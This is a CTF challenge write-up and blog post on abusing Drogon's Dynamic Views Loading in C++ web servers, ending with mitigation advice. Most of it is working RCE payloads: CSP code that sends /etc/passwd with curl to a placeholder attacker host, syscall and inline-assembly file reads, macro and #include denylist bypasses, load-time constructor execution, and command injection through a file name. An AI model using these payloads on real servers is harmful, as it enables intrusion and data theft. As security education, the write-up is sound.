---
title: Dynamic Views Loading – Abusing Server Side Rendering in Drogon
excerpt: What could go wrong releasing a C++ web server with "live reload" into the wild?
tags:
  - cpp
  - ctf
  - web
  - programming
  - linux
  - notes
  - writeup
thumbnail_src: assets/drogon-thumbnail.png
thumbnail_banner: true
tocOptions:
    tags: [h2, h3, h4]
related:
    posts: [attack-of-the-zip]
# preamble: |
---
Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web service running on the Drogon Web Framework. This time, our focus shifts from [exploring zip attacks in Juce](/posts/attack-of-the-zip/) to **exploring an alarming configuration in Drogon: Dynamic Views Loading** (hereafter abbreviated DVL).

In a hypothetical situation where a Drogon server with DVL is exposed to hackers, how many holes can be poked? What attack vectors can be achieved?^[This situation may be less hypothetical than we think. According to Shodan, there are over 1000 servers around the world running Drogon. How many do you think were poorly configured, with devs thinking… “I’ll just enable Dynamic Views Loading for convenience. Nobody can find my IP anyway.” I’m willing to bet there’s at least 1.]

At the same time, this is also a good exercise in defensive programming. If we released such a server, what (programming) defences are necessary to cover our sorry arse? When and where should we apply sanitisation and filtering? How do we properly allow “safe” programs? Is that even possible to begin with?

This turned out to be a fascinating endeavour, as there happen to be a *ton* of ways to compromise a vulnerable DVL-enabled server. In the making of the CTF challenges, I struggled to eliminate every single unintended solution.

{% image "assets/craft-a-ctf-web-chal.jpg", "jw-60", "Every time I find an unintended solution, a new one is just around the corner." %}

<sup>Every time I find an unintended solution, a new one is just around the corner.</sup>{.caption}

## Drogon Redux

[Drogon](https://github.com/drogonframework/drogon) is a C++ web framework built with C++17, containing a whole slew of features such as session handling, server side rendering, and websockets — features you would expect in a modern web framework.

Drogon's server side rendering is handled by CSP views (C++ Server Pages). Similar to ASP, JSP, PHP, and other HTML templates, these files are sprinkled with special markup such as `<%inc ... %>`, `<%c++ ... %>`, and {% raw %}`{% ... %}`{% endraw %}, which are evaluated when rendered.

### Simple View Example

Here's a simple example of a CSP:

```csp {data-label=Example.csp}
<!DOCTYPE html>
<html>
<body>
<%c++ if (true) { %>
    <h1>Hi [[ name ]]</h1>
<%c++ } else { %>
    <h1>Bye [[ name ]]</h1>
<%c++ } %>
</body>
</html>
```

We can specify C++ control-flow logic with `<%c++ ... %>` and substitute variables with `[[ ... ]]`.

To render this file, we'll call `newHttpViewResponse` and pass a `name` from the URL endpoint:

```cpp {data-label=main.cpp}
app().registerHandler(
    "/hello/{}",
    [](const HttpRequestPtr& req, std::function<void(const HttpResponsePtr&)>&& callback, const std::string& name) {
        HttpViewData data;
        data.insert("name", name);
        auto resp = HttpResponse::newHttpViewResponse("Example.csp", data);
        callback(resp);
    });
```

After starting the server, we can run `curl 127.0.0.1:8080/hello/Picard` and observe the following HTML:

```html {data-copy-off}
<!DOCTYPE html>
<html>
<body>
    <h1>Hi Picard</h1>
</body>
</html>
```

### Why Use Dynamic Views?

This is all very nice, until our application becomes a gargantuan, unwieldy mess. What if we want to fine-tune some HTML? Each minor change takes a full minute to recompile. Dynamically-typed, scripting languages with hot-reload suddenly look more appealing.

To address this, Drogon supports dynamic loading of views. New CSP files added to a target directory will be automagically compiled and loaded. To enable Dynamic Views Loading, we can add the following lines to our JSON configuration:

```json
"load_dynamic_views": true,
"dynamic_views_path": ["./views/d"],
```

or use the C++ equivalent:

```cpp
app().enableDynamicViewsLoading({"./views/d"}, "./views/d");
```

Drogon will then actively monitor the file path for new/modified .csp files.

### Dynamic Views: Compilation and Loading

How do dynamic views work in Drogon?

After all, C++ is compiled, not interpreted.

But it's possible to load compiled code at runtime through [shared objects](https://en.wikipedia.org/wiki/Shared_library). These are specially-compiled files which can be loaded on-the-fly. In Drogon, the process goes like so:

{% image "assets/drogon-dynamic-view-loading.png", "jw-50 alpha-imgv", "Flow Chart of Dynamic Views Loading" %}

<sup>Flow Chart of Dynamic Views Loading</sup>{.caption}

1. The user writes a .csp file to the dynamic view path. The rest is up to Drogon.
2. Drogon detects the new/modified .csp files.
3. Drogon translates the .csp to a regular C++ .h and .cc file, using the `drogon_ctl` command-line tool.
4. The .cc is compiled into a shared object (.so) using the `-shared` flag.
5. The .so is loaded with `dlopen`, after previous versions are unloaded with `dlclose`.^[`dlopen` seems to only be available [on Unix-like machines](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/CMakeLists.txt#L320).]
6. The new/updated view can now be used in application code.

All of this happens in [SharedLibManager.cc](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc). Feel free to take a gander.

### From CSP Markup to C++

Another natural question to ask is: how is CSP markup converted in C++ source code and compiled?

This is quite an important question, since it affects how we can inject code, and the defensive measures needed. We can analyse this by running...
```sh
drogon_ctl create view Example.csp
```
which generates Example.h and Example.cc.

Let's look at how C++ is generated from markup.

- `<%c++ ... %>` - content inside this tag is inserted into a `genText()` function.  
    ```csp {data-label=Example.csp}
    <h1>Example</h1>
    <%c++ int a = 40 + 2; $$ << a; %>
    <h2>Hello world!</h2>
    ```

    ```cpp {data-label=Example.cc data-copy-off}
    // Boilerplate: includes...
    using namespace drogon;
    std::string Example::genText(const DrTemplateData& Example_view_data)
    {
        drogon::OStringStream Example_tmp_stream;
        std::string layoutName{""};
        Example_tmp_stream << "<h1>Example</h1>\n";
        int a = 40 + 2; Example_tmp_stream << a; 
        Example_tmp_stream << "<h2>Hello world!</h2>\n";
        // Boilerplate: convert stream to string and return...
    }
    ```

    `Example_tmp_stream` is a [stringstream](https://stackoverflow.com/a/20595061/10239789) used to prepare the final HTML. Eventually, it gets converted to a string and returned.

- {% raw %}`{% ... %}`{% endraw %} - equivalent to `<%c++ $$ << ... %>`, it just echoes the expression. The closing {% raw %}`%}`{% endraw %} must be on the same line as the opening {% raw %}`{%`{% endraw %}.

- `<%inc ... %>` - meant for including additional libraries. Code is placed in file-level scope.  
    ```csp {data-label=Example.csp}
    <%inc
    #include <algorithm>
    #define MY_MACRO
    void my_function() {}
    %>
    <h1>Example</h1>
    ```
    
    ```cpp {data-label=Example.cc data-copy-off}
    // Boilerplate: includes...
    #include <algorithm>
    #define MY_MACRO
    void my_function() {}
    
    using namespace drogon;
    std::string Example::genText(const DrTemplateData& Example_view_data)
    {
        drogon::OStringStream Example_tmp_stream;
        std::string layoutName{""};
        Example_tmp_stream << "<h1>Example</h1>\n";
        // Boilerplate: convert stream to string and return...
    }
    ```

- `[[ ... ]]` - for inserting data passed from application code.
    ```csp {data-label=Example.csp}
    <h1>Hi [[name]]!</h1>
    ```

    ```cpp {data-label=Example.cc data-copy-off}
    // ...
    Example_tmp_stream << "<h1>Hi ";
    {
        auto & val=Example_view_data["name"];
        if(val.type()==typeid(const char *)){
            Example_tmp_stream<<*(std::any_cast<const char *>(&val));
        }else if(val.type()==typeid(std::string)||val.type()==typeid(const std::string)){
            Example_tmp_stream<<*(std::any_cast<const std::string>(&val));
        }
    }
    Example_tmp_stream << "!</h1>\n";
    // ...
    ```

## Attack Vectors

There are countless attack vectors to address.

1. **RCE via Rendered CSP.** First, we'll start by looking at a simple PoC which triggers RCE when the view is rendered.
2. **Bypasses.** We'll survey common functions and tricks to bypass a denylist.
3. **RCE via Init Section.** Here, we'll trigger RCE without rendering the view.
4. **RCE via File Name.** Finally, we'll discuss a harrowing insecurity in the DVL code path.

Not all of these were exploitable in my CTF chals. I selected a few vectors which I thought were interesting.

### 1. RCE via Rendered CSP

Suppose an attacker can write any CSP content in the dynamic views path. In the simplest case where filtering or checking is non-existent, the attacker can execute malicious commands using the usual `system` and `execve` functions found in libc. This allows us to exfiltrate sensitive information and launch reverse shells.

```csp {data-label=Example.csp}
<%c++
    system("curl http://attacker.site --data @/etc/passwd");
%>
```

To trigger this RCE, the application code needs to render the view with `HttpResponse::newHttpViewResponse("Example.csp")`{language=cpp}.

The following diagram shows where code execution occurs along the pipeline. We'll update the diagram as we explore other vectors.

{% image "assets/drogon-dynamic-view-loading-exec-on-render.png", "jw-60 alpha-imgv", "Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." %}

<sup>A simple and direct method of abusing CSPs. Execution occurs when the view is rendered, e.g. by calling `newHttpViewResponse`.</sup>{.caption}

### 2. Bypassing Simple Denylists

If the loophole resides in a few key functions, can't we simply block those functions?

No. This is extremely difficult in a diverse language such as C++. Not only does it have its own language features and standard library; but it also inherits most of C's baggage. There are *many* ways to bypass a denylist. As such, a sufficiently secure denylist will either be exhaustively long or severely limiting.

{% alert "success" %}
This goes to show how denylists (blacklists) are generally discouraged from a security PoV, as it's difficult to account for all methods of bypass. In the case of programming languages, however, allowlists (whitelists) are also difficult to construct, as limiting ourselves to a set of tokens severely constrict the realm of possible CSP programs, and may hinder development.^[Whitelisting a program's {% abbr "AST", "Abstract Syntax Tree" %} could prove effective, but this requires us to first generate an AST — a non-trivial problem.]

The only solution, really, is to not enable DVLs. More on mitigations later.
{% endalert %}

A sufficient denylist needs to consider the following approaches, similar to any C/C++ denylist-bypass challenge. The actual denylist has been left as an exercise for the reader.

#### File Read/Write with `fstream`, `fopen`

```csp
<%inc
#include <fstream>
#include <sstream>
%>
<%c++
    std::ifstream ifs{"/etc/passwd"};
    if (ifs.is_open()) {
        $$ << ifs.rdbuf();
    } else {
        $$ << "Failed to open file.";
    }
%>
```

#### File Read/Write with `open`, `read`

If high-level file IO isn't an option, we could always resort to the lower-level Linux functions.

```csp
<%inc
#include <unistd.h>
%>
<%c++
    char buffer[99] = {};
    read(open("/etc/passwd", 0), buffer, 99);
    $$ << buffer;
%>
```

#### File Read/Write, RCE with `syscall`

We can go one level deeper using the `syscall()` function. This allows us to call the usual `open`, `read`, `write`, `execve` syscalls, albeit less readably.

```csp
<%inc
#include <unistd.h>
%>
<%c++
    char buffer[99] = {};
    syscall(0, syscall(2, "/etc/passwd", 0       ), buffer, 99);
//  read(      open(      "/etc/passwd", O_RDONLY), buffer, 99);
    $$ << buffer;
%>
```

Thanks to syscall 59, we can also run `execve` to achieve RCE.

```csp
<%inc
#include <unistd.h>
%>
<%c++
    const char* argv[] = {
        "/usr/bin/curl",
        "http://attacker.site",
        "--data",
        "@/etc/passwd",
        NULL
    };
    syscall(59, "/usr/bin/curl", argv, 0);
%>
```

Handy Reference: [Linux x86 Syscalls - filippo.io](https://filippo.io/linux-syscall-table/)

#### File Read with `mmap`

After opening and creating a file descriptor via `open` or `syscall(2, ...)`, we can also use `mmap` to perform a read instead of the usual `read`.

```csp
<%inc
#include <unistd.h>
#include <sys/mman.h>
%>
<%c++
    $$ << (char*)mmap(NULL, 99, 1, 2, syscall(2,"/etc/passwd", 0), 0);
    // mmap(addr, length, memory_protection, flags, fd, offset)
%>
```

#### File Read/Write, RCE via Inline Assembly

Pretty much any syscall in C can be translated to assembly, and GCC's extended assembly makes it convenient to pass input and output.

The following CSP opens and reads `/etc/passwd` into a buffer, then outputs it. This is equivalent to the open-read idiom we used above.

```csp
<%c++
    char file[] = "/etc/passwd", buffer[256] = {0};
    asm(R"(
        mov $2, %%rax;
        lea (%0), %%rdi;
        mov $0, %%rsi;
        syscall;
        
        mov %%rax, %%rdi;
        mov $0, %%rax;
        lea (%1), %%rsi;
        mov $255, %%rdx;
        syscall
    )"
        : : "b" ( file ), "d" ( buffer )
    );
    $$ << buffer;
%>
```

`"b" ( file )` and `"d" ( buffer )` are inputs to our asm procedure. The letters `b` and `d` refer to the `%rbx` and `%rdx` register. I chose these registers specifically to avoid conflicts. (`%rax` gets written with `2` on the first line, `%rcx` gets overwritten by the first syscall.)

Exercises for the reader:

- Try to figure out how the assembly maps to the C syscalls in the previous sections.
- `buffer` is technically an output, so why do we treat it as an input?
- Demonstrate RCE by using the execve syscall.

Blocking the keyword `syscall` will not work here. We can bypass it with a simple `sys" "call`, since adjacent strings are concatenated in C/C++ (`"a" "b" == "ab"`). To properly block such calls, we would need to block the functions invoking inline assembly, such as `asm`.

Handy Reference: [Using Inline Assembly in C/C++](https://www.codeproject.com/Articles/15971/Using-Inline-Assembly-in-C-C)

#### Local File Inclusion with  `#include`
{# Need double space in header to avoid weird issue where "with" and "include" are jammed together in ToC. #}

Filters applied to a set of file extensions can be easily bypassed by uploading a file with an unfiltered extension, then `#include`-ing it in the CSP. All `#include` really does is copy-paste the included file's content, which then gets compiled as C/C++ code.

- Example.csp - with stringent checks on denied words.
    ```csp {data-label=Example.csp}
    <%inc #include "safe.txt" %>
    ```

- safe.txt - other C++ code which gets a free pass, possibly using a technique above.
    ```cpp {data-label=safe.txt}
    system("curl http://attacker.site --data @/etc/passwd");
    ```

This allows us to bypass situations where, say, .csp files are strictly checked, but certain extensions are not checked at all.

I'll admit this one slipped my mind; quite a few players discovered this unintended solution during the CTF.

#### Bypass Denylists with Macro Token Concatenation (`##`)

C/C++ macros have some quirky features:

- `#`: Converts a macro argument's value to a string.
    ```cpp
    #define STR(X) #X
    // STR(abc) == "abc"
    ```

- `##`: Joins two arguments.
    ```cpp
    #define GLUE(X, Y) X ## Y
    GLUE(c, out) << "hello world!" << GLUE(e, ndl); // cout << "hello world!" << endl;

    #define GLUE2(X) X ## _literally
    int GLUE2(var) = 1; // int var_literally = 1;
    ```

The second feature allows us to bypass denylists which only match full words.

For instance, if a denylist blocks `system`, we can do `GLUE(s, ystem)`.

```csp
<%inc #define GLUE(X, Y) X ## Y %>
<%c++
    GLUE(s, ystem)("curl http://attacker.site --data @/etc/passwd");
%>
```

### 3. RCE via Init Section

The previous tricks use `<%c++` which only executes when the view is rendered. But what if I told you we can execute code *without even rendering the view*?

That's right, all we need is to load the .so to execute code!

{% image "assets/drogon-dynamic-view-loading-exec-on-init.png", "jw-60 alpha-imgv", "Code can be executed right after loading the .so binary." %}

<sup>Using `<%c++` will execute code when "View is Rendered", but by strategically placing code in the `.init` section of the binary, we can get code to execute right after loading the .so!</sup>{.caption}

Let's look at a few examples of how we can achieve this tomfoolery.

#### Init Section via `<%inc`

There are various ways to run code prior to `main()`. We can make use of the fact that `<%inc` places code in file scope.

```csp
<%inc
// 1. Assign variable with function call.
int a = system("curl http://attacker.site --data @/etc/passwd");

// 2. To run more code, we can create a function first.
int foo() {
    return system("curl http://attacker.site --data @/etc/passwd");
}
int b = foo();

// 3. GCC attributes - gets called automatically.
__attribute__((constructor))
void bar() {
    system("curl http://attacker.site --data @/etc/passwd");
}
%>
```

When compiled, all of this is placed in the `.init_array` section, which allows multiple function pointers to be called during initialisation.

#### Escaping Function Scope with `<%c++` and `[[`

Blocking `<%inc` is not enough. Even with `<%c++` and `[[`, it is possible to escape function scope and insert a function in the top-level. This is partly by-design, so that like PHP, we can use C++ if-statements and for-loops to dynamically generate HTML. But we can also abuse this to escape the `genText()` function.

We demonstrate this with the following CSP:

```csp {data-label=Example.csp}
<%c++ 
} 
__attribute__((constructor)) void injected()
{
    system("curl http://attacker.site --data @/etc/passwd");
}
std::string dummy(const DrTemplateData&)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
%>
```

and here's the generated C++:

```cpp {data-label=Example.cc data-copy-off}
// Boilerplate: includes...
std::string Example::genText(const DrTemplateData& Example_view_data)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
 
} 
__attribute__((constructor)) void injected()
{
    system("curl http://attacker.site --data @/etc/passwd");
}
std::string dummy(const DrTemplateData&)
{
    drogon::OStringStream Example_tmp_stream;
    std::string layoutName{""};
    // Boilerplate: convert stream to string and return....
```

The same idea goes for variable markup `[[...]]`, the only difference being whitespace is not allowed.

```csp
<h1>Hi [[name"];}}__attribute__((constructor))void/**/injected(){system("...");}std::string/**/dummy(const/**/DrTemplateData&data){drogon::OStringStream/**/Example_tmp_stream;std::string/**/layoutName{""};{auto&val=data["]]</h1>
```

Likewise for `<%layout` and `<%view`. (Left as an exercise for the reader.)

---

Thought that was the worst we could do? It gets worse.

### 4. RCE via File Name

Remember how Drogon runs `drogon_ctl` to convert .csp files to .cc files? Guess how this command is run.

That’s right, `system()` is [called](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc#L169). And since the CSP file name can be pretty much anything — subject to Linux’s file path conditions — we can inject arbitrary commands and achieve RCE!

{% image "assets/drogon-dynamic-view-loading-exec-on-filename.png", "jw-70 alpha-imgv", "Malicious code can be executed when `drogon_ctl` is run using the filename." %}

Additionally, our command can contain slashes, since Drogon recursively scans subdirectories. A file named `foo$(curl attacker.site/abcd)` will be treated as a folder (`foo$(curl attacker.site/`) + a file (`abcd)`).

## Takeaways and Mitigations

Although this was meant for a couple fun 48-hour CTF challenges, it feels appropriate to close with some tips on defence.

So what did we learn?

1. Drogon, at the moment, does not sandbox or properly sanitise CSP content.^[At the time of writing, I'm using Drogon version 1.9.1.] This is by design, since CSPs inherently contain trusted content.
2. There are three main ways to achieve RCE on a DVL-enabled Drogon server. And this comes with the prerequisite of file-write privileges.
   1. RCE via Rendered CSP
   2. RCE via Init Section
   3. RCE via File Name
3. Denylists need to consider a wide range of bypass methods. 

And mitigations?

1. Don't enable Dynamic Views Loading, unless you're in a local dev environment. Switch off DVL after using.
2. Don't allow untrusted input to be compiled and loaded as views; statically or dynamically.
3. Protecc your dynamic views directory. Don't allow untrusted files to be written there.
    - It doesn't matter if the view will be rendered in application code, because — [as we discovered earlier](#4-rce-via-file-name) — once `drogon_ctl` is run, an RCE endpoint is already exposed.
4. If, on the off chance, your environment accepts untrusted CSP files, you should consider using some filtering/denylist mechanism.
    - If filtering is performed, it should happen before files are written to the dynamic views directory. Once files are written, it's too late: Drogon kicks in and devours the CSP.
    {% image "assets/drogon-dynamic-view-loading-defence.png", "jw-70 alpha-imgv", "Defensive filtering, if any, should occur before CSP files are written." %}
    <p class="caption">
    <sup>Defensive filtering, if any, should occur before CSP files are written.</sup>
    </p>

Do I expect the RCE issues to be fixed? Considering the purpose of DVLs... probably not. Judging by the maintainer's stance, DVLs are purely meant for development:

> *Note: This feature is best used to adjust the HTML page during the development phase. In the production environment, it is recommended to compile the csp file directly into the target file. This is mainly for security and stability.* ([Source](https://github.com/drogonframework/drogon/wiki/ENG-06-View#Dynamic-compilation-and-loading-of-views:~:text=This%20feature%20is%20best%20used%20to%20adjust%20the%20HTML%20page%20during%20the%20development%20phase.))


## Conclusion

Although Dynamic Views Loading (DVL) seems appealing for implementing features such as user-generated content or dynamically adding plugins, DVL is a dangerous liability if left in the open. In this post, we've demonstrated multiple ways to exploit DVL, given file-write privileges. DVL is ill-suited for production-use and should only be used for its intended purpose — local testing in development environments.

{% image "https://www.discoverhongkong.com/content/dam/dhk/gohk/2023/dragon-s-back/poi-4-960x720-a.jpg", "jw-80", "Dragon's Back in Hong Kong Island. Photo credit: Hong Kong Tourism Board." %}

<sup>Nice View: the *Dragon's Back* Hiking Trail in Hong Kong Island.</sup>{.caption}
